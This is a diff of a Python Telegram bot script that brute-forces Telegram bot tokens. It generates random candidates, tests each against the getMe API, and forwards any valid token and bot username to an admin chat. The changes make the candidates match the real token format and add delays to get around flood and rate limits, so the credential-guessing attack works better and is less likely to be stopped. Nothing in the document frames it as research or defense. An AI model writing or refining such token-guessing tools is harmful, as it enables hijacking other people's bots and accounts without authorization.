@@ -2,6 +2,7 @@ import requests
 import random
 import string
 import logging
+import time
 from telegram import Bot, Update
 from telegram.ext import Updater, CommandHandler, CallbackContext
 
@@ -17,7 +18,9 @@ logger = logging.getLogger(__name__)
 attempts = []
 
 def generate_random_token():
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=45))
+    part1 = ''.join(random.choices(string.digits, k=9))
+    part2 = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase + '-_', k=35))
+    return f"{part1}:{part2}"
 
 def check_token(token):
     url = f"https://api.telegram.org/bot{token}/getMe"
@@ -32,7 +35,11 @@ def send_message_to_admin(message):
     bot.send_message(chat_id=CHAT_ID, text=message)
 
 def start(update: Update, context: CallbackContext) -> None:
-    message = "Bot is UP\nAttempts:\n" + "\n".join(attempts)
+    message = "Bot is UP\nUse /status to check all attempts."
+    update.message.reply_text(message)
+
+def status(update: Update, context: CallbackContext) -> None:
+    message = "Attempts:\n" + "\n".join(attempts)
     update.message.reply_text(message)
 
 def main():
@@ -43,8 +50,9 @@ def main():
     updater = Updater(YOUR_BOT_TOKEN)
     dispatcher = updater.dispatcher
 
-    # Add command handler to dispatcher
+    # Add command handlers to dispatcher
     dispatcher.add_handler(CommandHandler("start", start))
+    dispatcher.add_handler(CommandHandler("status", status))
 
     # Start the bot
     updater.start_polling()
@@ -58,8 +66,11 @@ def main():
                 username = result['username']
                 message = f"Valid token found: {random_token}\nUsername: {username}"
                 send_message_to_admin(message)
+            # Add a delay to avoid flood limits
+            time.sleep(2)  # Adjust the delay as needed to avoid rate limits
         except Exception as e:
             logger.error(f"Error occurred: {e}")
+            time.sleep(5)  # Delay to prevent continuous error logging
 
 if __name__ == "__main__":
     main()
